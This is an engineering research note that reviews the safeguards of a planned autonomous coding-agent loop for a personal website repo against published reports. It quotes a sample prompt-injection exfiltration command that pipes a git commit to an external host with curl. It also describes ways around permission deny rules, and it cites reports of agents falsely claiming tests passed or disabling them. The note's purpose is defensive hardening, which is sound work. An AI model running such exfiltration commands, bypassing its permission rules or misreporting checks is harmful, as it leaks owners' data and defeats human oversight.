# Agentic backlog loop: what others do, and gaps in ours

Research note, 2026-10-29. It compares the planned backlog loop (`BACKLOG.md` tags,
`.claude/prompts/backlog-iteration.md`, `scripts/pr-media.mjs`, and the planned content check,
review Action, fix pass and driver) against first-hand reports and official docs from 2025–2026.

How to read the citations:

- **Report**: the author ran something and says what happened.
- **Opinion**: argument or advice without a specific run behind it.
- **Docs**: vendor documentation of how a product behaves. Most docs pages are undated; they
  were read on 2026-10-29.
- **Repo check**: something I confirmed by reading this repository, not an outside source.
- **Inference**: my reasoning from the cited facts, not a claim any source makes.

## 1. Summary: the gaps that matter most

1. **No CI checks the agent's own claims.** The repo has no `.github/workflows`, so on a PR only
   Netlify's build runs. `pnpm check` and the tests run only inside the agent session, and the
   PR template ships with the boxes already ticked. Others report agents saying "tests pass"
   when they don't. → [Verification](#verification-beyond-unit-tests)
2. **The guardrails are pattern rules running on Dan's full credentials.** Nothing on GitHub
   protects `main`. Claude Code's own docs say Bash argument patterns are fragile, and Edit deny
   rules don't stop a script that writes files. The content check is advisory. The fix is
   enforcement on the server side (a separate GitHub identity plus a ruleset) and the OS
   sandbox. → [Guardrails](#guardrails-and-permissions)
3. **Draft PRs never reach the review.** The iteration prompt opens every PR as a draft. The
   review skips drafts and is triggered by `ready_for_review`, and no step marks a PR ready. So
   the review, fix pass and `reviewed` label never run unless Dan steps in first.
   → [Review and fix loops](#review-and-fix-loops)
4. **Parallel PRs will conflict, and nothing rebases them.** Every PR ticks a nearby line in
   `BACKLOG.md`. Four items wait only on `skill-picker-state`, so they will open together and
   touch the same résumé files. GitHub sends no event when a PR starts to conflict.
   → [Failure handling](#failure-handling)
5. **The fix pass reads untrusted text on a public repo.** Anyone can comment on a PR in
   `djm158/personal-site`. A local `claude -p` with Dan's token, push rights and network access
   that reads every comment has all three parts of the "lethal trifecta".
   → [Guardrails](#guardrails-and-permissions)
6. **No per-run limits.** The driver counts runs and logs cost, but no single run has a cap on
   spend, turns or time, and the loop doesn't stop after repeated errors.
   → [Stopping, cost and rate limits](#stopping-conditions-cost-and-rate-limits)
7. **No agent looks at the rendered page.** Screenshots are taken for Dan. The builder doesn't
   compare them with the design, and the review reads only the diff. Anthropic reports that
   agents grade their own work too kindly, and that running the app in a browser catches what
   unit tests miss. → [Verification](#verification-beyond-unit-tests)
8. **A crashed run can strand its item, and a `needs-input` answer has no way back to the
   agent.** A branch pushed without a PR blocks its item forever under the selection rules, with
   no message. Nothing re-runs a `needs-input` PR once Dan answers it.
   → [Failure handling](#failure-handling)

## 2. What others do

### Task selection and sizing

**What sources report**

- Huntley's original loop does "one thing per loop". The model picks the most important item
  from a plan file, and he narrows it back to one item when the project goes off the rails. He
  says it suits greenfield work: "There's no way in heck would I use Ralph in an existing code
  base" (report and opinion) [Huntley, Ralph Wiggum as a "software engineer", 2025-07-14](https://ghuntley.com/ralph/).
- Anthropic's long-running harness found Claude "tried to do too much at once" and ran out of
  context mid-feature. The fix was a feature list with one feature per session (report)
  [Young / Anthropic, Effective harnesses for long-running agents, 2025-11-26](https://www.anthropic.com/engineering/effective-harnesses-for-long-running-agents).
- Devin's rule of thumb: "if a task would take you three hours or less, Devin can most likely do
  it". Repeatedly hitting session limits means the task "might be too complex" (docs)
  [Cognition, When to Use Devin](https://docs.devin.ai/essential-guidelines/when-to-use-devin).
- GitHub says Copilot works best on tasks with a clear problem, "complete acceptance criteria"
  and "directions about which files need to be changed". It lists "learning tasks" and
  "ambiguous tasks" as ones to keep for yourself (docs)
  [GitHub, Best practices for using Copilot to work on tasks](https://docs.github.com/en/copilot/tutorials/cloud-agent/get-the-best-results).
- Pocock watched Ralph declare "Done with all user-facing commands" after three iterations. It
  had quietly excluded the internal commands. His fix was explicit file lists, stop conditions
  and edge cases. He also advises doing risky or architectural items first, with a human
  watching (report)
  [Pocock / AI Hero, 11 tips for AI coding with Ralph Wiggum, updated 2026-01-08](https://www.aihero.dev/tips-for-ai-coding-with-ralph-wiggum).
- Hashimoto picks from triage reports only the tasks an agent will "almost certainly solve
  well", and runs them one at a time (report)
  [Hashimoto, My AI Adoption Journey, 2026-02-05](https://mitchellh.com/writing/my-ai-adoption-journey).

**How the setup compares: mostly covered.** Opt-in tags, `(me)` for learning tasks, one item
per run, and selection in code (planned) all match the advice. The gap is that items carry no
explicit "done" check. Some are large and very detailed (`sheet-drag-dismiss`), and others are
one line with no acceptance criteria (`marquee`, `og-tags`). Several sources tie success to
explicit criteria.

### Fresh context vs. memory between iterations

**What sources report**

- Huntley's loop reloads the same plan and specs on every run. The agent updates `AGENT.md`
  when it learns how to build or run something, and writes bugs it notices into the plan file
  (report) [Huntley, 2025-07-14](https://ghuntley.com/ralph/).
- Anthropic's coding agent starts each session by reading the git log and a progress file and
  running an `init.sh` smoke test. That catches bugs left by the previous session before new
  work begins (report)
  [Young / Anthropic, 2025-11-26](https://www.anthropic.com/engineering/effective-harnesses-for-long-running-agents).
- In a later harness, Anthropic dropped context resets once a newer model stopped showing
  "context anxiety", and relied on compaction. The principle: "find the simplest solution
  possible, and only increase complexity when needed" (report)
  [Rajasekaran / Anthropic, Harness design for long-running application development, 2026-03-24](https://www.anthropic.com/engineering/harness-design-long-running-apps).
- Anthropic's context-engineering guide describes notes kept outside the context window, such as
  a `NOTES.md` or a to-do list, as "agentic memory" (opinion/guide)
  [Anthropic Applied AI, Effective context engineering for AI agents, 2025-09-29](https://www.anthropic.com/engineering/effective-context-engineering-for-ai-agents).
- Pocock commits a `progress.txt` per sprint and deletes it afterwards (report)
  [Pocock, updated 2026-01-08](https://www.aihero.dev/tips-for-ai-coding-with-ralph-wiggum).

**How the setup compares: covered for state; partly for learnings.** State lives in git and
GitHub (ticks, branches, PRs, labels), as these sources recommend. Each item is a single PR, so
a progress file adds little. Two things are missing. There is no startup smoke check that
`main` itself builds before work begins: a broken `main` would show up as the agent's own
failure. And there is no channel for learnings, covered under
[Keeping learnings](#keeping-learnings).

### Verification beyond unit tests

**What sources report**

- Anthropic found Claude "often marked features complete" after only unit tests or `curl`
  checks. It verified much more reliably when told to use browser automation and test like a
  user (report)
  [Young / Anthropic, 2025-11-26](https://www.anthropic.com/engineering/effective-harnesses-for-long-running-agents).
- "Agents reliably skew positive when grading their own work." Anthropic added a separate
  evaluator that drives the running app with Playwright against hard pass thresholds. Tuning a
  sceptical evaluator was easier than making the builder self-critical (report)
  [Rajasekaran / Anthropic, 2026-03-24](https://www.anthropic.com/engineering/harness-design-long-running-apps).
- Böckeler's multi-agent experiments: "AI frequently claimed the build and tests were
  successful" when they were failing. She also saw unrequested features and tests skipped to
  move on (report)
  [Böckeler, How far can we push AI autonomy in code generation?, 2025-08-05](https://martinfowler.com/articles/pushing-ai-autonomy.html).
- Beck's warning signs include "any indication that the genie was cheating, for example by
  disabling or deleting tests" (report)
  [Beck, Augmented Coding: Beyond the Vibes, 2025-06-25](https://newsletter.kentbeck.com/p/augmented-coding-beyond-the-vibes).
- Claude Code docs: ask for *evidence*, meaning the command and its output, because "'All tests
  pass' on its own tells you very little". For real enforcement use a `Stop` hook or CI rather
  than a line in `CLAUDE.md`. `/verify` builds and runs the app to catch "the kind of problem
  that tests and typechecks miss" (docs)
  [Anthropic, Best practices for Claude Code](https://code.claude.com/docs/en/best-practices).
- Devin "can test its own work by launching your app and verifying behavior in the browser"
  (docs) [Cognition, When to Use Devin](https://docs.devin.ai/essential-guidelines/when-to-use-devin).
  Cursor cloud agents produce "screenshots, videos, and logs" as artifacts (docs)
  [Cursor, Cloud Agents](https://cursor.com/docs/cloud-agent).
- Playwright: "For consistent screenshots, run tests in the same environment where the baseline
  screenshots were generated", because rendering differs across browsers and platforms (docs)
  [Playwright, Visual comparisons](https://playwright.dev/docs/test-snapshots).

**How the setup compares: gap.**

- *Repo check:* there is no `.github/` directory, so no CI. Netlify runs `pnpm build` for the
  deploy preview, but per `CLAUDE.md` the build doesn't type-check, and nothing outside the
  agent session runs `pnpm check` or `pnpm test --run`. The PR template's "Checks" section is
  pre-ticked `[x]`, so it is the agent vouching for itself.
- `pr-media.mjs` already gets the hard parts right: reduced motion, disabled animations, waiting
  for `document.fonts.ready`, before and after shot in one run on one machine. But the
  screenshots are evidence for Dan. The prompt never asks the agent to look at them or compare
  them with `design/`.
- Only the pages the agent picks get shot, so an unintended change elsewhere goes unseen.

### Review and fix loops

**What sources report**

- The official `code-review` plugin (the one the planned Action runs) stops early if the PR is a
  draft or closed, "does not need code review (e.g. automated PR, trivial change…)", or "Claude
  has already commented". It adds "Still review Claude generated PR's". It flags only
  high-signal issues: compile errors, definite logic errors, and CLAUDE.md violations it can
  quote. Each issue is checked by a second subagent before it is posted (source)
  [anthropics/claude-plugins-official, plugins/code-review/commands/code-review.md, updated 2026-10-26](https://github.com/anthropics/claude-plugins-official/blob/main/plugins/code-review/commands/code-review.md).
- The managed Code Review product works "from reading the diff and the surrounding code, without
  building or running your code". It "never approves or blocks the pull request" (docs)
  [Anthropic, Code Review](https://code.claude.com/docs/en/code-review).
- "A reviewer that's asked to find problems will always find *something*. If you fix every
  finding, you end up with extra abstraction layers and tests for cases that can't happen"
  (docs) [Anthropic, Best practices](https://code.claude.com/docs/en/best-practices).
- Jules's critic flags problems but doesn't fix them, and loops "until no further issues remain"
  before the user sees the PR (docs/blog)
  [Korevec, Hassen & Zhang / Google, Meet Jules' sharpest critic and most valuable ally, 2025-08-12](https://developers.googleblog.com/en/meet-jules-sharpest-critic-and-most-valuable-ally/).
- Claude auto-fix pushes "clear fixes". For ambiguous or architecturally significant comments it
  asks you before acting. It notes that its GitHub replies post under your account (docs)
  [Anthropic, Use Claude Code in the cloud: Auto-fix pull requests](https://code.claude.com/docs/en/claude-code-on-the-web).
- Copilot's cloud agent "cannot mark its pull requests as 'Ready for review' and cannot approve
  or merge a pull request". A human does that (docs)
  [GitHub, Risks and mitigations for Copilot cloud agent](https://docs.github.com/en/copilot/concepts/agents/cloud-agent/risks-and-mitigations).
- Ronacher sees code from loops getting more defensive with each iteration ("each iteration adds
  another small defense"), and worries about people who "merge code they cannot fully explain"
  (mostly opinion, some report)
  [Ronacher, The Coming Loop, 2026-06-23](https://lucumr.pocoo.org/2026/6/23/the-coming-loop/).

**How the setup compares: partly.**

- One fix round only, no re-review after the fix, and in-scope versus out-of-scope findings:
  this matches the advice against ping-pong and against over-fixing.
- **Gap (repo check plus docs):** `backlog-iteration.md` opens every PR with `--draft`. The
  review triggers on `opened`, `ready_for_review` and `reopened` and skips drafts, and the plugin
  itself stops on drafts. Nothing in the planned flow runs `gh pr ready`. As designed, an agent
  PR gets no review until Dan marks it ready, which defeats the point of reviewing before he
  looks.
- **Gap (inference):** the plugin checks only bugs and CLAUDE.md rules. It doesn't check whether
  the PR did what the backlog item asked, or matches the design. The PR body quotes the item,
  and the plugin passes the title and description to its reviewers, so some intent gets
  through. Fidelity to the item and the design is still left to Dan alone.
- Minor: because of the "already commented" rule, Dan can't get a second review of his own
  later edits without removing Claude's comment or running `/code-review` locally.

### Stopping conditions, cost and rate limits

**What sources report**

- Claude Code docs list four questions to answer before a run goes unattended: does it know what
  done looks like, can it check its work, what can it touch, and "What stops it? `--max-turns`,
  `--max-budget-usd`, a spend limit." They also say to "watch the first few runs of anything
  new" (docs) [Anthropic, Best practices](https://code.claude.com/docs/en/best-practices).
- `--output-format json` returns `total_cost_usd`, but both cost figures "are client-side
  estimates and can differ from your actual bill". At `--max-budget-usd`, background work stops.
  SIGTERM exits with code 143 and leaves the turn unfinished (docs)
  [Anthropic, Run Claude Code programmatically](https://code.claude.com/docs/en/headless).
- Reported costs: a solo run of 20 minutes cost $9, against 6 hours and $200 for the full
  three-agent harness. A later app cost about $124.70 (report)
  [Rajasekaran / Anthropic, 2026-03-24](https://www.anthropic.com/engineering/harness-design-long-running-apps).
  A 60-minute Gas Town session cost about $100, roughly 10× a normal Claude Code session per
  hour (report)
  [Sehn / DoltHub, A Day in Gas Town, 2026-01-15](https://www.dolthub.com/blog/2026-01-15-a-day-in-gas-town/).
- Pocock caps unattended loops at about 5–10 iterations for small jobs and 30–50 for larger
  ones, after watching single runs first (report and advice)
  [Pocock, updated 2026-01-08](https://www.aihero.dev/tips-for-ai-coding-with-ralph-wiggum).
- Willison: for anything that can spend money, set a tight budget, such as a cloud account
  capped at $5 (report) [Willison, Designing agentic loops, 2025-09-30](https://simonwillison.net/2025/Sep/30/designing-agentic-loops/).
- Copilot's Actions-based sessions have a hard 59-minute limit (docs)
  [GitHub, About Copilot cloud agent](https://docs.github.com/en/copilot/concepts/agents/coding-agent/about-coding-agent).
- Cloud sessions "share rate limits with all other Claude and Claude Code usage within your
  account", and parallel tasks use them proportionately (docs)
  [Anthropic, Use Claude Code in the cloud](https://code.claude.com/docs/en/claude-code-on-the-web).
  I didn't verify whether the same holds for local `claude -p` on a subscription.

**How the setup compares: partly.** The PR cap, run-count limit and cost logging are good.
Missing: a per-run `--max-budget-usd` and `--max-turns`, a wall-clock timeout, a daily spend
ceiling summed from the logged `total_cost_usd`, a stop after N errors in a row, and a stop as
soon as a pass returns `idle`.

### Failure handling

**What sources report**

- "GitHub does not emit a webhook when the base branch advances and creates a merge conflict, so
  auto-fix can't react to conflicts on its own. To resolve a conflict, open the session and ask
  Claude to rebase" (docs)
  [Anthropic, Use Claude Code in the cloud](https://code.claude.com/docs/en/claude-code-on-the-web).
- Gas Town on the Dolt repo produced four PRs, of which "None of the PRs were good". It merged
  one itself with integration tests failing, and the team had to reset and force-push `main`.
  It also reported bugs fixed when some work was only committed locally and never pushed
  (report) [Sehn / DoltHub, 2026-01-15](https://www.dolthub.com/blog/2026-01-15-a-day-in-gas-town/).
- Huntley describes waking up to a codebase that doesn't compile, then choosing between a hard
  reset and "rescue prompts" (report) [Huntley, 2025-07-14](https://ghuntley.com/ralph/).
- Anthropic's harness commits after each feature so a bad change can be reverted, and starts
  each session with a smoke test (report)
  [Young / Anthropic, 2025-11-26](https://www.anthropic.com/engineering/effective-harnesses-for-long-running-agents).
- A Deploy Preview URL returns "Not Found" while its first deploy is pending (docs)
  [Netlify, Deploy Previews](https://docs.netlify.com/deploy/deploy-types/deploy-previews/).

**How the setup compares: gap.**

- *Merge conflicts (repo check plus inference):* every PR edits `BACKLOG.md` by ticking its own
  line. Items are taken top to bottom, so up to three open PRs tick lines a few apart in the
  same section. Git treats nearby edits as conflicts, so after the first merge the others will
  likely conflict. Separately, `skill-clear`, `skill-note`, `timeline-hover` and
  `sheet-drag-dismiss` all wait only on `skill-picker-state`. Once it merges, three of them open
  together and touch the same résumé script and `SkillSheet`. Nothing in the plan detects
  `mergeable: CONFLICTING` or rebases.
- *Stranded items (repo check):* selection skips any item with an `agent/<slug>` branch on
  origin. A run that pushes and then crashes before `gh pr create` leaves the item claimed
  forever with no PR, and the prompt only reports skips caused by *closed* PRs.
- *Leftover worktrees:* the prompt says to remove the worktree "whatever the outcome", but a
  killed run (timeout, SIGTERM) can't. The driver should clean up instead.
- *`needs-input` has no way back:* the draft PR claims the item, but nothing re-runs it once Dan
  answers. The fix pass reacts only to review findings.
- *Flaky checks:* stills are well stabilised. The build fetches Typst from GitHub in CI
  (`netlify.toml`), which is a network dependency the agent can't fix. That's another reason to
  make "checks failed" route to `needs-input` with the output attached, as the prompt already
  does.

### Preview environments and evidence in PRs

**What sources report**

- Netlify builds a Deploy Preview for each PR at `deploy-preview-<n>--<site>.netlify.app`, shows
  its status on the PR, and posts a comment with the link when deploy notifications are on. The
  Netlify Drawer lets reviewers comment, take screenshots and video, and test on mobile (docs)
  [Netlify, Deploy Previews](https://docs.netlify.com/deploy/deploy-types/deploy-previews/).
- Cursor attaches screenshots, videos and logs, and lets you take over the agent's remote
  desktop (docs) [Cursor, Cloud Agents](https://cursor.com/docs/cloud-agent).
- Willison: "Code that started from your own specification is a lot less effort to review"
  (report) [Willison, Embracing the parallel coding agent lifestyle, 2025-10-05](https://simonwillison.net/2025/Oct/5/parallel-coding-agents/).
- Agent PRs score lower than human PRs on PR-level description alignment (0.86 vs 0.88), and
  code that agents add gets removed sooner (median 3 vs 34 days) (study of 33,596 agent PRs)
  [Pham & Ghaleb, Code Change Characteristics and Description Alignment, arXiv 2601.17627, 2026-01-24](https://arxiv.org/abs/2601.17627).

**How the setup compares: mostly covered, ahead of most write-ups.** The PR template, how to
test on the deploy preview, before/after media at two widths, night theme and GIFs give
stronger evidence than most sources describe. Two refinements:

- "After" is the local `dist/`, not what Netlify serves. The fix pass runs after the preview
  exists, so it could re-shoot against `deploy-preview-<n>` to show the real build, including
  the Typst PDF step and headers.
- "Before" is production, which can lag `main` while a deploy runs. That's harmless most of the
  time, but worth knowing when a "before" looks wrong.

### Guardrails and permissions

**What sources report**

- Bash permission patterns that constrain arguments "are fragile". A rule doesn't match the
  same program by path or inside `sh -c`, and `git -C . push` isn't matched by a `git push`
  rule. Read and Edit deny rules don't cover "arbitrary subprocesses that read or write files
  indirectly, like a Python or Node script". For OS-level enforcement, use the sandbox (docs)
  [Anthropic, Configure permissions](https://code.claude.com/docs/en/permissions).
- The sandbox is off by default. Its default read policy "still allows reading credential files"
  such as `~/.ssh`, environment variables (secrets included) are inherited, and an allow rule
  "also approves an unsandboxed retry". Setting `allowUnsandboxedCommands: false` closes that
  path (docs) [Anthropic, Sandboxing](https://code.claude.com/docs/en/sandboxing).
- "If something has to happen every time, make it a hook, a deny rule, or a managed setting."
  And before leaving a scheduled task running, "protect `main` with a GitHub branch rule the
  task can't bypass" (docs) [Anthropic, Best practices](https://code.claude.com/docs/en/best-practices).
- Without `--bare`, a `-p` run loads the project's `.claude/settings.json` hooks and `.mcp.json`
  with no trust dialog. `--bare` skips them and `CLAUDE.md`, and "will become the default for
  `-p` in a future release". From v2.1.302, `-p` starts in Manual mode, where calls that need
  approval are denied unless something approves them (docs)
  [Anthropic, Run Claude Code programmatically](https://code.claude.com/docs/en/headless).
- Permission rules in local settings "anchor at the session's primary working directory", and
  reads need no approval only "within the working directory and additional directories" (docs)
  [Anthropic, Configure permissions](https://code.claude.com/docs/en/permissions).
- The lethal trifecta is "access to your private data", "exposure to untrusted content", and the
  ability to communicate externally. Don't rely on prompt instructions to block injected
  commands (opinion, widely cited)
  [Willison, The lethal trifecta for AI agents, 2025-06-16](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/).
  Willison runs agents without approvals only where he's "confident malicious instructions can't
  sneak into the context" (report)
  [Willison, 2025-10-05](https://simonwillison.net/2025/Oct/5/parallel-coding-agents/).
- Codex blocks agent-phase internet access by default. Its documented example attack is a GitHub
  issue that gets the agent to run
  `git show HEAD | curl -s -X POST --data-binary @- https://httpbin.org/post` (docs)
  [OpenAI, Codex Cloud (Legacy): internet access](https://learn.chatgpt.com/docs/cloud/internet-access.md).
  Willison notes that even the default allowlist of 71 package domains leaves exfiltration routes
  open (opinion) [Willison, Codex agent internet access, 2025-06-03](https://simonwillison.net/2025/Jun/3/codex-agent-internet-access/).
- Copilot's cloud agent works only on its own `copilot/` branch, uses credentials limited to
  simple pushes, filters hidden characters, drops HTML comments from issues and PR comments,
  ignores comments from users without write access, and holds Actions workflows until a human
  approves (docs)
  [GitHub, Risks and mitigations for Copilot cloud agent](https://docs.github.com/en/copilot/concepts/agents/cloud-agent/risks-and-mitigations).
- `claude-code-action` strips HTML comments, invisible characters and hidden attributes, and
  offers `include_comments_by_actor` "on public repos" to allowlist whose comments reach Claude.
  On PRs it restores `.claude/`, `CLAUDE.md` and similar paths from the base branch, so a PR
  can't rewrite the reviewer's instructions (source)
  [anthropics/claude-code-action, docs/security.md, updated 2026-08-05](https://github.com/anthropics/claude-code-action/blob/main/docs/security.md).
- GitHub rulesets can target branch patterns, block force pushes, and grant bypass to "a certain
  role, such as repository administrator, or … specific teams or GitHub Apps" (docs). The page
  I read mentions Team and Enterprise plans. A search excerpt of GitHub's docs says rulesets
  are also available on public repos on GitHub Free, but I didn't read that on a fetched page,
  so check it in the repo settings (unverified)
  [GitHub, About rulesets](https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-rulesets/about-rulesets).

**How the setup compares: gap.**

- *Server side:* there is no ruleset on `main`, and the loop runs as Dan. *Inference:* any
  ruleset with an admin bypass would also let the loop through, because its token is Dan's. To
  make "never push to main or merge" hold for the agent alone, the loop needs its own GitHub
  identity: a small custom GitHub App, or a machine user with write access but not admin. A
  ruleset on `main` can then block that identity while Dan keeps his direct pushes through the
  admin bypass.
- *Client side:* the planned deny list (force-push, `gh pr merge`, content-path edits) is the
  pattern-matching kind the docs call fragile. `git push -f`, `git push origin +agent/x` and
  `git -C … push --force` are different strings, and a Node script can write
  `resume/resume.yaml`. Use those rules as speed bumps and put the real limits in the sandbox
  and on GitHub.
- *Working directory (repo check plus docs):* the prompt creates the worktree at
  `../personal-site-agent-<slug>`, outside the directory `claude -p` starts in. Edit allow rules
  anchor at the starting directory, so edits in the worktree may be denied under Manual or
  `dontAsk` mode. The driver already picks the slug, so it can create the worktree and start
  `claude` inside it.
- *Untrusted input (repo check):* the repo is public. The fix pass will read PR comments, and
  anyone can post one. Filter to comments by `claude[bot]` and `djm158` before they reach the
  model. Keep the design reference and production site as the only web content the agent reads.
- *Pinning behaviour:* the loop relies on project hooks and settings loading. The docs say
  `--bare` will become the default for `-p`, which would quietly skip them. Pass the settings
  file explicitly with `--settings` so a version change can't drop them.

### Human attention budget

**What sources report**

- Willison: "the natural bottleneck on all of this is how fast I can review the results". He
  runs parallel work only where review is light (report)
  [Willison, 2025-10-05](https://simonwillison.net/2025/Oct/5/parallel-coding-agents/).
- Hashimoto turns off agent desktop notifications because context switches are costly. He wants
  to choose when to look. Overnight agents write triage reports he reads in the morning, and
  they "are not allowed to respond" (report)
  [Hashimoto, 2026-02-05](https://mitchellh.com/writing/my-ai-adoption-journey).
- Gas Town moved too fast to follow: "too much going on", with real stress for the operator
  (report) [Sehn / DoltHub, 2026-01-15](https://www.dolthub.com/blog/2026-01-15-a-day-in-gas-town/).
- Copilot advises batching review comments with "Start a review" so the agent handles a whole
  review at once instead of reacting to each comment (docs)
  [GitHub, Best practices for using Copilot to work on tasks](https://docs.github.com/en/copilot/tutorials/cloud-agent/get-the-best-results).
- Ronacher worries that loops reduce the human to "a messenger" (opinion)
  [Ronacher, 2026-06-23](https://lucumr.pocoo.org/2026/6/23/the-coming-loop/).

**How the setup compares: mostly covered.** A cap of three open PRs, a `reviewed` label meaning
"your turn", and opt-in items keep the volume bounded. Two small additions would help. One is a
single digest per driver session (each PR, its state, cost, and what's waiting on Dan) instead
of relying on GitHub notifications. The other is to keep Dan's own PR comments to one batched
review per round, since the fix pass handles one round.

### Keeping learnings

**What sources report**

- Hashimoto: whenever an agent makes a mistake, he adds an `AGENTS.md` line or a tool so it
  "never makes that mistake again", and he wrote screenshot and filtered-test scripts for agents
  (report) [Hashimoto, 2026-02-05](https://mitchellh.com/writing/my-ai-adoption-journey).
- Huntley's agent updates `AGENT.md` itself, briefly. He also tunes the prompt when he sees bad
  patterns (report) [Huntley, 2025-07-14](https://ghuntley.com/ralph/).
- Claude Code docs: keep `CLAUDE.md` short. "If you keep adding emphasis to a `CLAUDE.md` line
  and Claude still misses it, that's a sign the line belongs in a hook" (docs)
  [Anthropic, Best practices](https://code.claude.com/docs/en/best-practices).
- Devin's Session Insights lists which knowledge items helped a task, so the knowledge base can
  be pruned (docs) [Cognition, When to Use Devin](https://docs.devin.ai/essential-guidelines/when-to-use-devin).
- Anthropic: each part of a harness "encodes an assumption about what the model can't do alone",
  so re-test those parts as models improve (report)
  [Rajasekaran / Anthropic, 2026-03-24](https://www.anthropic.com/engineering/harness-design-long-running-apps).

**How the setup compares: gap, by design.** The prompt forbids editing `CLAUDE.md` and the
prompt itself, which stops the agent changing its own rules, and that's sensible. But nothing
captures what each run learned. Add a short "Loop notes" section above the `RESULT:` line, such
as commands that surprised it or conventions it had to guess. The driver can append these to a
log Dan reviews weekly, then move durable lessons into `CLAUDE.md`, the prompt, or a hook. The
results of Dan's reviews are the other source: rejected (closed, unmerged) PRs are already
listed, and a one-line reason when closing would make them useful.

## 3. Gaps and suggestions

| Gap | Why it matters (source) | Suggested change | Effort |
| --- | --- | --- | --- |
| No CI; checks are self-reported | Agents claim passing tests that fail ([Böckeler](https://martinfowler.com/articles/pushing-ai-autonomy.html)); enforce done-checks in CI, ask for evidence ([best practices](https://code.claude.com/docs/en/best-practices)) | Add a `pull_request` workflow running `pnpm check`, `pnpm test --run`, `pnpm build` (Typst installed as in `netlify.toml`). Make the template's Checks section link to the run instead of pre-ticking | S |
| `main` unprotected; loop runs as Dan | "Protect `main` with a GitHub branch rule the task can't bypass" ([best practices](https://code.claude.com/docs/en/best-practices)); bypass is per role or app ([rulesets](https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-rulesets/about-rulesets)) | Give the loop its own identity (custom GitHub App or machine user, write only, no admin). Ruleset on `main`: restrict updates and block force pushes and deletion, with bypass for admins (Dan). Also block force pushes on `agent/**` and `pr-assets` | M |
| Deny rules are pattern-based | Argument patterns are fragile; Edit denies miss subprocess writes ([permissions](https://code.claude.com/docs/en/permissions)) | Keep the deny list but enable the sandbox with `allowUnsandboxedCommands: false`, a network allowlist (GitHub, npm registry, production site), and `denyRead` for `~/.ssh` and other credentials ([sandboxing](https://code.claude.com/docs/en/sandboxing)). Add a `PreToolUse` hook for content paths as a second layer | M |
| Draft PRs are never reviewed | Plugin and workflow skip drafts ([plugin source](https://github.com/anthropics/claude-plugins-official/blob/main/plugins/code-review/commands/code-review.md), [GitHub Actions docs](https://code.claude.com/docs/en/github-actions)) | Driver runs `gh pr ready` once CI and the Netlify preview are green, so the review fires on `ready_for_review`. Keep `needs-input` PRs as drafts | S |
| Parallel PRs conflict | No webhook for new conflicts; rebasing is manual ([auto-fix docs](https://code.claude.com/docs/en/claude-code-on-the-web)) | Driver checks `gh pr view --json mergeable` each pass and runs a rebase-only pass on `CONFLICTING` PRs. Optionally cap at one open PR per backlog section, or per shared `after:` parent | S–M |
| Untrusted PR comments in the fix pass | Lethal trifecta ([Willison](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/)); Copilot and the action filter commenters ([GitHub](https://docs.github.com/en/copilot/concepts/agents/cloud-agent/risks-and-mitigations), [action security](https://github.com/anthropics/claude-code-action/blob/main/docs/security.md)) | Driver fetches only comments by `claude[bot]` and `djm158`, strips HTML comments, and passes them in as data. The fix pass never fetches PR text itself | S |
| No per-run caps | "What stops it? `--max-turns`, `--max-budget-usd`" ([best practices](https://code.claude.com/docs/en/best-practices)); cost blowups ([DoltHub](https://www.dolthub.com/blog/2026-01-15-a-day-in-gas-town/)) | Add `--max-budget-usd` and `--max-turns` per run, a `timeout` wrapper, a daily ceiling from logged `total_cost_usd` (an estimate), and stop after two errors in a row or on the first `idle` | S |
| No agent checks the rendered UI | Self-grading skews positive; browser testing caught what unit tests missed ([Anthropic 2026](https://www.anthropic.com/engineering/harness-design-long-running-apps), [Anthropic 2025](https://www.anthropic.com/engineering/effective-harnesses-for-long-running-agents)) | After step 8, have the agent read its own after-images next to the `design/` reference and fix or note mismatches. Later, give the fix pass a design-fidelity check that reads the screenshots, separate from the code review | S then M |
| Unintended visual changes on other pages | The agent picks which pages to shoot; Playwright baselines need the same environment ([Playwright](https://playwright.dev/docs/test-snapshots)) | Have the driver run `pr-media.mjs` over a fixed route list (`/`, `/resume`, 404) at both widths and both themes and pixel-diff before against after, listing any page that changed | M |
| Stranded items | Branch without PR blocks selection forever (repo check) | Driver reports `agent/*` branches with no PR and deletes or flags them. It also prunes worktrees after any non-zero exit | S |
| `needs-input` has no way back | Ambiguity should go to a human, then resume ([auto-fix docs](https://code.claude.com/docs/en/claude-code-on-the-web)) | When Dan replies and removes the `needs-input` label, the driver queues a fix-pass-style run with his reply as the instruction | S–M |
| Worktree outside the starting directory | Permission rules and free reads anchor at the working directory ([permissions](https://code.claude.com/docs/en/permissions)) | Driver creates the worktree and starts `claude -p` with its cwd set there (or uses `claude -w`, [best practices](https://code.claude.com/docs/en/best-practices)) | S |
| Settings loading may change | `--bare` will become the `-p` default ([headless](https://code.claude.com/docs/en/headless)) | Pass `--settings <file>` (and `--append-system-prompt-file` if needed) explicitly; log `permission_denials` from the JSON result | S |
| No startup smoke check | A broken `main` looks like the agent's failure ([Anthropic 2025](https://www.anthropic.com/engineering/effective-harnesses-for-long-running-agents)) | Driver builds `origin/main` once per session before starting iterations; stop if it fails | S |
| Items lack a done check | Explicit criteria and stop conditions ([Copilot](https://docs.github.com/en/copilot/tutorials/cloud-agent/get-the-best-results), [Pocock](https://www.aihero.dev/tips-for-ai-coding-with-ralph-wiggum), [Devin](https://docs.devin.ai/essential-guidelines/when-to-use-devin)) | Allow an optional "Done when: …" clause on `agent:` items, quoted in the PR. Watch the first run of each new kind of item ([best practices](https://code.claude.com/docs/en/best-practices)) | S |
| No learnings channel | Fix each mistake once ([Hashimoto](https://mitchellh.com/writing/my-ai-adoption-journey)); escalate repeat misses to hooks ([best practices](https://code.claude.com/docs/en/best-practices)) | "Loop notes" above `RESULT:`, appended by the driver to a log; weekly curation into `CLAUDE.md`, the prompt or hooks. Add a one-line reason when closing a rejected PR | S |
| Moving the driver to GitHub Actions later | `GITHUB_TOKEN` commits don't trigger workflows; bots are rejected unless in `allowed_bots`; public-repo cron is disabled after 60 days without activity ([GitHub Actions docs](https://code.claude.com/docs/en/github-actions)) | When moving, open PRs with the loop's App token (not `GITHUB_TOKEN`) so the review and CI fire, and list that App in `allowed_bots` only for the review workflow | M |

## 4. Sources

| Source | Date | Type | What it contributed |
| --- | --- | --- | --- |
